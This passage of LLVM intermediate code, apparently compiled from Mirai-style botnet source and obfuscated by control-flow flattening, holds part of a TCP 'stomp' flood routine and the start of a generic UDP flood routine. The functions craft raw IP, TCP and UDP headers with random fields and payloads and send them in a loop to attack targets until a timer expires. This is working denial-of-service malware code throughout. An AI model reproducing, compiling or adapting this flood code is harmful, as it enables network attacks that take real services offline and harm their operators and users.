  %341 = trunc i64 %340 to i16
  %342 = call zeroext i16 @htons(i16 zeroext %341) #7
  %343 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %344 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %343, i32 0, i32 2
  store i16 %342, i16* %344, align 2
  %345 = load i16, i16* %16, align 2
  %346 = call zeroext i16 @htons(i16 zeroext %345) #7
  %347 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 3
  store i16 %346, i16* %348, align 4
  %349 = load i8, i8* %17, align 1
  %350 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %351 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %350, i32 0, i32 5
  store i8 %349, i8* %351, align 4
  %352 = load i8, i8* %18, align 1
  %353 = icmp ne i8 %352, 0
  %354 = select i1 %353, i32 -482911132, i32 1550468242
  store i32 %354, i32* %switchVar
  br label %loopEnd

; <label>:355:                                    ; preds = %loopEntry
  %356 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %357 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %358 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %357, i32 0, i32 4
  store i16 %356, i16* %358, align 2
  store i32 1550468242, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  %360 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %361 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %360, i32 0, i32 6
  store i8 6, i8* %361, align 1
  %362 = load i32, i32* @LOCAL_ADDR, align 4
  %363 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %364 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %363, i32 0, i32 8
  store i32 %362, i32* %364, align 4
  %365 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %366 = load i32, i32* %11, align 4
  %367 = sext i32 %366 to i64
  %368 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %365, i64 %367
  %369 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i32 0, i32 0
  %370 = load i32, i32* %369, align 4
  %371 = load %struct.iphdr*, %struct.iphdr** %39, align 8
  %372 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %371, i32 0, i32 9
  store i32 %370, i32* %372, align 4
  %373 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %374 = load i32, i32* %11, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %376, i32 0, i32 3
  %378 = load i16, i16* %377, align 4
  %379 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %380 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %379, i32 0, i32 0
  store i16 %378, i16* %380, align 4
  %381 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %382 = load i32, i32* %11, align 4
  %383 = sext i32 %382 to i64
  %384 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %381, i64 %383
  %385 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %384, i32 0, i32 4
  %386 = load i16, i16* %385, align 2
  %387 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %388 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %387, i32 0, i32 1
  store i16 %386, i16* %388, align 2
  %389 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %390 = load i32, i32* %11, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i32 0, i32 2
  %394 = load i32, i32* %393, align 4
  %395 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %396 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %395, i32 0, i32 2
  store i32 %394, i32* %396, align 4
  %397 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %398 = load i32, i32* %11, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %397, i64 %399
  %401 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %400, i32 0, i32 1
  %402 = load i32, i32* %401, align 4
  %403 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %404 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %403, i32 0, i32 3
  store i32 %402, i32* %404, align 4
  %405 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %406 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %405, i32 0, i32 4
  %407 = load i16, i16* %406, align 4
  %408 = and i16 %407, -241
  %409 = or i16 %408, 128
  store i16 %409, i16* %406, align 4
  %410 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %411 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %410, i32 0, i32 4
  %412 = load i16, i16* %411, align 4
  %413 = and i16 %412, -257
  %414 = or i16 %413, 256
  store i16 %414, i16* %411, align 4
  %415 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %416 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %415, i32 0, i32 4
  %417 = load i16, i16* %416, align 4
  %418 = and i16 %417, -4097
  %419 = or i16 %418, 4096
  store i16 %419, i16* %416, align 4
  %420 = call i32 @rand_next()
  %421 = and i32 %420, 65535
  %422 = trunc i32 %421 to i16
  %423 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %424 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %423, i32 0, i32 5
  store i16 %422, i16* %424, align 2
  %425 = load i8, i8* %20, align 1
  %426 = sext i8 %425 to i16
  %427 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %428 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %427, i32 0, i32 4
  %429 = load i16, i16* %428, align 4
  %430 = and i16 %426, 1
  %431 = shl i16 %430, 13
  %432 = and i16 %429, -8193
  %433 = or i16 %432, %431
  store i16 %433, i16* %428, align 4
  %434 = load i8, i8* %21, align 1
  %435 = sext i8 %434 to i16
  %436 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %437 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %436, i32 0, i32 4
  %438 = load i16, i16* %437, align 4
  %439 = and i16 %435, 1
  %440 = shl i16 %439, 12
  %441 = and i16 %438, -4097
  %442 = or i16 %441, %440
  store i16 %442, i16* %437, align 4
  %443 = load i8, i8* %22, align 1
  %444 = sext i8 %443 to i16
  %445 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %446 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %445, i32 0, i32 4
  %447 = load i16, i16* %446, align 4
  %448 = and i16 %444, 1
  %449 = shl i16 %448, 11
  %450 = and i16 %447, -2049
  %451 = or i16 %450, %449
  store i16 %451, i16* %446, align 4
  %452 = load i8, i8* %23, align 1
  %453 = sext i8 %452 to i16
  %454 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %455 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %454, i32 0, i32 4
  %456 = load i16, i16* %455, align 4
  %457 = and i16 %453, 1
  %458 = shl i16 %457, 10
  %459 = and i16 %456, -1025
  %460 = or i16 %459, %458
  store i16 %460, i16* %455, align 4
  %461 = load i8, i8* %24, align 1
  %462 = sext i8 %461 to i16
  %463 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 4
  %465 = load i16, i16* %464, align 4
  %466 = and i16 %462, 1
  %467 = shl i16 %466, 9
  %468 = and i16 %465, -513
  %469 = or i16 %468, %467
  store i16 %469, i16* %464, align 4
  %470 = load i8, i8* %25, align 1
  %471 = sext i8 %470 to i16
  %472 = load %struct.tcphdr*, %struct.tcphdr** %40, align 8
  %473 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %472, i32 0, i32 4
  %474 = load i16, i16* %473, align 4
  %475 = and i16 %471, 1
  %476 = shl i16 %475, 8
  %477 = and i16 %474, -257
  %478 = or i16 %477, %476
  store i16 %478, i16* %473, align 4
  %479 = load i8*, i8** %41, align 8
  %480 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %479, i32 %480)
  %481 = load i8*, i8** %41, align 8
  %482 = load i32, i32* %26, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds i8, i8* %481, i64 %483
  store i8 0, i8* %484, align 1
  store i32 1341872347, i32* %switchVar
  br label %loopEnd

; <label>:485:                                    ; preds = %loopEntry
  %486 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 4
  %488 = load i16, i16* %487, align 4
  %489 = lshr i16 %488, 8
  %490 = and i16 %489, 1
  %491 = zext i16 %490 to i32
  %492 = icmp ne i32 %491, 0
  %493 = select i1 %492, i32 559084569, i32 -292653103
  store i32 %493, i32* %switchVar
  br label %loopEnd

; <label>:494:                                    ; preds = %loopEntry
  %495 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %496 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %495, i32 0, i32 4
  %497 = load i16, i16* %496, align 4
  %498 = lshr i16 %497, 10
  %499 = and i16 %498, 1
  %500 = zext i16 %499 to i32
  %501 = icmp ne i32 %500, 0
  %502 = select i1 %501, i32 559084569, i32 1332816141
  store i32 %502, i32* %switchVar
  br label %loopEnd

; <label>:503:                                    ; preds = %loopEntry
  %504 = load i32, i32* %29, align 4
  %505 = call i32 @close(i32 %504)
  store i32 -1081826921, i32* %switchVar
  br label %loopEnd

; <label>:506:                                    ; preds = %loopEntry
  store i32 1843339481, i32* %switchVar
  br label %loopEnd

; <label>:507:                                    ; preds = %loopEntry
  store i32 -802613507, i32* %switchVar
  br label %loopEnd

; <label>:508:                                    ; preds = %loopEntry
  store i32 713181484, i32* %switchVar
  br label %loopEnd

; <label>:509:                                    ; preds = %loopEntry
  %510 = call i64 @time(i64* null) #6
  %511 = load i64, i64* %34, align 8
  %512 = sub nsw i64 %510, %511
  %513 = icmp sgt i64 %512, 10
  %514 = select i1 %513, i32 363882911, i32 1264749460
  store i32 %514, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = load i32, i32* %29, align 4
  %517 = call i32 @close(i32 %516)
  store i32 -1081826921, i32* %switchVar
  br label %loopEnd

; <label>:518:                                    ; preds = %loopEntry
  store i32 -505325339, i32* %switchVar
  br label %loopEnd

; <label>:519:                                    ; preds = %loopEntry
  store i32 -1666677531, i32* %switchVar
  br label %loopEnd

; <label>:520:                                    ; preds = %loopEntry
  %521 = load i32, i32* %11, align 4
  %522 = add nsw i32 %521, 1
  store i32 %522, i32* %11, align 4
  store i32 -1650130981, i32* %switchVar
  br label %loopEnd

; <label>:523:                                    ; preds = %loopEntry
  store i32 -1447345684, i32* %switchVar
  br label %loopEnd

; <label>:524:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1736780348, i32* %switchVar
  br label %loopEnd

; <label>:525:                                    ; preds = %loopEntry
  %526 = load i32, i32* %11, align 4
  %527 = load i8, i8* %7, align 1
  %528 = zext i8 %527 to i32
  %529 = icmp slt i32 %526, %528
  %530 = select i1 %529, i32 509670279, i32 -1605276179
  store i32 %530, i32* %switchVar
  br label %loopEnd

; <label>:531:                                    ; preds = %loopEntry
  %532 = load i8**, i8*** %14, align 8
  %533 = load i32, i32* %11, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds i8*, i8** %532, i64 %534
  %536 = load i8*, i8** %535, align 8
  store i8* %536, i8** %42, align 8
  %537 = load i8*, i8** %42, align 8
  %538 = bitcast i8* %537 to %struct.iphdr*
  store %struct.iphdr* %538, %struct.iphdr** %43, align 8
  %539 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %540 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %539, i64 1
  %541 = bitcast %struct.iphdr* %540 to %struct.tcphdr*
  store %struct.tcphdr* %541, %struct.tcphdr** %44, align 8
  %542 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %543 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %542, i64 1
  %544 = bitcast %struct.tcphdr* %543 to i8*
  store i8* %544, i8** %45, align 8
  %545 = load i16, i16* %16, align 2
  %546 = zext i16 %545 to i32
  %547 = icmp eq i32 %546, 65535
  %548 = select i1 %547, i32 1074338117, i32 -1725671454
  store i32 %548, i32* %switchVar
  br label %loopEnd

; <label>:549:                                    ; preds = %loopEntry
  %550 = call i32 @rand_next()
  %551 = and i32 %550, 65535
  %552 = trunc i32 %551 to i16
  %553 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %554 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %553, i32 0, i32 3
  store i16 %552, i16* %554, align 4
  store i32 -1725671454, i32* %switchVar
  br label %loopEnd

; <label>:555:                                    ; preds = %loopEntry
  %556 = load i8, i8* %27, align 1
  %557 = icmp ne i8 %556, 0
  %558 = select i1 %557, i32 1883782623, i32 2105117675
  store i32 %558, i32* %switchVar
  br label %loopEnd

; <label>:559:                                    ; preds = %loopEntry
  %560 = load i8*, i8** %45, align 8
  %561 = load i32, i32* %26, align 4
  call void @rand_alphastr(i8* %560, i32 %561)
  %562 = load i8*, i8** %45, align 8
  %563 = load i32, i32* %26, align 4
  %564 = sext i32 %563 to i64
  %565 = getelementptr inbounds i8, i8* %562, i64 %564
  store i8 0, i8* %565, align 1
  store i32 2105117675, i32* %switchVar
  br label %loopEnd

; <label>:566:                                    ; preds = %loopEntry
  %567 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %568 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %567, i32 0, i32 7
  store i16 0, i16* %568, align 2
  %569 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %570 = bitcast %struct.iphdr* %569 to i16*
  %571 = call zeroext i16 @checksum_generic(i16* %570, i32 20)
  %572 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %573 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %572, i32 0, i32 7
  store i16 %571, i16* %573, align 2
  %574 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %575 = load i32, i32* %11, align 4
  %576 = sext i32 %575 to i64
  %577 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %574, i64 %576
  %578 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %577, i32 0, i32 1
  %579 = load i32, i32* %578, align 4
  %580 = add i32 %579, 1
  store i32 %580, i32* %578, align 4
  %581 = trunc i32 %579 to i16
  %582 = call zeroext i16 @htons(i16 zeroext %581) #7
  %583 = zext i16 %582 to i32
  %584 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %585 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %584, i32 0, i32 2
  store i32 %583, i32* %585, align 4
  %586 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %13, align 8
  %587 = load i32, i32* %11, align 4
  %588 = sext i32 %587 to i64
  %589 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %586, i64 %588
  %590 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %589, i32 0, i32 2
  %591 = load i32, i32* %590, align 4
  %592 = trunc i32 %591 to i16
  %593 = call zeroext i16 @htons(i16 zeroext %592) #7
  %594 = zext i16 %593 to i32
  %595 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %596 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %595, i32 0, i32 3
  store i32 %594, i32* %596, align 4
  %597 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 6
  store i16 0, i16* %598, align 4
  %599 = load %struct.iphdr*, %struct.iphdr** %43, align 8
  %600 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %601 = bitcast %struct.tcphdr* %600 to i8*
  %602 = load i32, i32* %26, align 4
  %603 = sext i32 %602 to i64
  %604 = add i64 20, %603
  %605 = trunc i64 %604 to i16
  %606 = call zeroext i16 @htons(i16 zeroext %605) #7
  %607 = load i32, i32* %26, align 4
  %608 = sext i32 %607 to i64
  %609 = add i64 20, %608
  %610 = trunc i64 %609 to i32
  %611 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %599, i8* %601, i16 zeroext %606, i32 %610)
  %612 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 6
  store i16 %611, i16* %613, align 4
  %614 = load %struct.tcphdr*, %struct.tcphdr** %44, align 8
  %615 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %614, i32 0, i32 1
  %616 = load i16, i16* %615, align 2
  %617 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %618 = load i32, i32* %11, align 4
  %619 = sext i32 %618 to i64
  %620 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %617, i64 %619
  %621 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %620, i32 0, i32 0
  %622 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %621, i32 0, i32 1
  store i16 %616, i16* %622, align 2
  %623 = load i32, i32* %12, align 4
  %624 = load i8*, i8** %42, align 8
  %625 = load i32, i32* %26, align 4
  %626 = sext i32 %625 to i64
  %627 = add i64 40, %626
  %628 = bitcast %union.__CONST_SOCKADDR_ARG* %46 to %struct.sockaddr**
  %629 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %630 = load i32, i32* %11, align 4
  %631 = sext i32 %630 to i64
  %632 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %629, i64 %631
  %633 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %632, i32 0, i32 0
  %634 = bitcast %struct.sockaddr_in* %633 to %struct.sockaddr*
  store %struct.sockaddr* %634, %struct.sockaddr** %628, align 8
  %635 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %46, i32 0, i32 0
  %636 = load %struct.sockaddr*, %struct.sockaddr** %635, align 8
  %637 = call i64 @sendto(i32 %623, i8* %624, i64 %627, i32 16384, %struct.sockaddr* %636, i32 16)
  store i32 -830693268, i32* %switchVar
  br label %loopEnd

; <label>:638:                                    ; preds = %loopEntry
  %639 = load i32, i32* %11, align 4
  %640 = add nsw i32 %639, 1
  store i32 %640, i32* %11, align 4
  store i32 -1736780348, i32* %switchVar
  br label %loopEnd

; <label>:641:                                    ; preds = %loopEntry
  %642 = call i64 @time(i64* null) #6
  %643 = load i32, i32* %28, align 4
  %644 = sext i32 %643 to i64
  %645 = icmp sgt i64 %642, %644
  %646 = select i1 %645, i32 -245314430, i32 779648956
  store i32 %646, i32* %switchVar
  br label %loopEnd

; <label>:647:                                    ; preds = %loopEntry
  store i32 1450885253, i32* %switchVar
  br label %loopEnd

; <label>:648:                                    ; preds = %loopEntry
  store i32 -1447345684, i32* %switchVar
  br label %loopEnd

; <label>:649:                                    ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %648, %647, %641, %638, %566, %559, %555, %549, %531, %525, %524, %523, %520, %519, %518, %515, %509, %508, %507, %506, %503, %494, %485, %359, %355, %263, %254, %245, %232, %227, %218, %217, %205, %197, %193, %188, %183, %174, %153, %137, %136, %132, %131, %125, %124, %121, %115, %114, %first, %switchDefault
  br label %loopEntry
}

declare i64 @recvfrom(i32, i8*, i64, i32, %struct.sockaddr*, i32*) #5

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_generic(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %.reg2mem = alloca i32
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i16, align 2
  %21 = alloca i8, align 1
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %31 = load i8, i8* %7, align 1
  %32 = zext i8 %31 to i64
  %33 = call noalias i8* @calloc(i64 %32, i64 8) #6
  %34 = bitcast i8* %33 to i8**
  store i8** %34, i8*** %13, align 8
  %35 = load i8, i8* %9, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 2, i32 0)
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* %14, align 1
  %39 = load i8, i8* %9, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 3, i32 65535)
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = load i8, i8* %9, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 4, i32 64)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %16, align 1
  %47 = load i8, i8* %9, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 5, i32 0)
  %50 = trunc i32 %49 to i8
  store i8 %50, i8* %17, align 1
  %51 = load i8, i8* %9, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 6, i32 65535)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %18, align 2
  %55 = load i8, i8* %9, align 1
  %56 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %57 = call i32 @attack_get_opt_int(i8 zeroext %55, %struct.attack_option* %56, i8 zeroext 7, i32 65535)
  %58 = trunc i32 %57 to i16
  store i16 %58, i16* %19, align 2
  %59 = load i8, i8* %9, align 1
  %60 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %61 = call i32 @attack_get_opt_int(i8 zeroext %59, %struct.attack_option* %60, i8 zeroext 0, i32 512)
  %62 = trunc i32 %61 to i16
  store i16 %62, i16* %20, align 2
  %63 = load i8, i8* %9, align 1
  %64 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %65 = call i32 @attack_get_opt_int(i8 zeroext %63, %struct.attack_option* %64, i8 zeroext 1, i32 1)
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %21, align 1
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = load i32, i32* @LOCAL_ADDR, align 4
  %70 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 24, i32 %69)
  store i32 %70, i32* %22, align 4
  %71 = call i64 @time(i64* null) #6
  %72 = load i32, i32* %6, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = trunc i64 %74 to i32
  store i32 %75, i32* %23, align 4
  %76 = load i16, i16* %20, align 2
  %77 = zext i16 %76 to i32
  store i32 %77, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 -1225736692, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1225736692, label %first
    i32 1605940768, label %80
    i32 811481440, label %81
    i32 1324478719, label %85
    i32 8481743, label %86
    i32 437458906, label %92
    i32 -359502132, label %95
    i32 -1783873699, label %96
    i32 726664824, label %102
    i32 -1121453600, label %147
    i32 801458690, label %151
    i32 1532528474, label %180
    i32 -1050671100, label %183
    i32 -2036075837, label %184
    i32 -1737114187, label %185
    i32 -1212422533, label %191
    i32 -1739185091, label %214
    i32 -1475799674, label %235
    i32 -1597120818, label %239
    i32 -790244818, label %243
    i32 -1858571803, label %248
    i32 1217982647, label %253
    i32 1847266420, label %258
    i32 1357991639, label %263
    i32 -1981405512, label %268
    i32 1111597512, label %273
    i32 1113947455, label %277
    i32 -1881556396, label %285
    i32 840927688, label %332
    i32 1652238684, label %335
    i32 1502090289, label %341
    i32 1043754097, label %342
    i32 -1903852555, label %343
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %78 = icmp sgt i32 %.reload, 1460
  %79 = select i1 %78, i32 1605940768, i32 811481440
  store i32 %79, i32* %switchVar
  br label %loopEnd

; <label>:80:                                     ; preds = %loopEntry
  store i16 1460, i16* %20, align 2
  store i32 811481440, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %82, i32* %12, align 4
  %83 = icmp eq i32 %82, -1
  %84 = select i1 %83, i32 1324478719, i32 8481743
  store i32 %84, i32* %switchVar
  br label %loopEnd

; <label>:85:                                     ; preds = %loopEntry
  store i32 -1903852555, i32* %switchVar
  br label %loopEnd

; <label>:86:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %87 = load i32, i32* %12, align 4
  %88 = bitcast i32* %11 to i8*
  %89 = call i32 @setsockopt(i32 %87, i32 0, i32 3, i8* %88, i32 4) #6
  %90 = icmp eq i32 %89, -1
  %91 = select i1 %90, i32 437458906, i32 -359502132
  store i32 %91, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  %93 = load i32, i32* %12, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1903852555, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 -1783873699, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %11, align 4
  %98 = load i8, i8* %7, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  %101 = select i1 %100, i32 726664824, i32 -1050671100
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %104 = load i8**, i8*** %13, align 8
  %105 = load i32, i32* %11, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8*, i8** %104, i64 %106
  store i8* %103, i8** %107, align 8
  %108 = load i8**, i8*** %13, align 8
  %109 = load i32, i32* %11, align 4
  %110 = sext i32 %109 to i64
  %111 = getelementptr inbounds i8*, i8** %108, i64 %110
  %112 = load i8*, i8** %111, align 8
  %113 = bitcast i8* %112 to %struct.iphdr*
  store %struct.iphdr* %113, %struct.iphdr** %24, align 8
  %114 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %115 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %114, i64 1
  %116 = bitcast %struct.iphdr* %115 to %struct.udphdr*
  store %struct.udphdr* %116, %struct.udphdr** %25, align 8
  %117 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %118 = bitcast %struct.iphdr* %117 to i8*
  %119 = load i8, i8* %118, align 4
  %120 = and i8 %119, 15
  %121 = or i8 %120, 64
  store i8 %121, i8* %118, align 4
  %122 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = and i8 %124, -16
  %126 = or i8 %125, 5
  store i8 %126, i8* %123, align 4
  %127 = load i8, i8* %14, align 1
  %128 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %129 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %128, i32 0, i32 1
  store i8 %127, i8* %129, align 1
  %130 = load i16, i16* %20, align 2
  %131 = zext i16 %130 to i64
  %132 = add i64 28, %131
  %133 = trunc i64 %132 to i16
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 2
  store i16 %134, i16* %136, align 2
  %137 = load i16, i16* %15, align 2
  %138 = call zeroext i16 @htons(i16 zeroext %137) #7
  %139 = load %struct.iphdr*, %struct.iphdr** %24, align 8
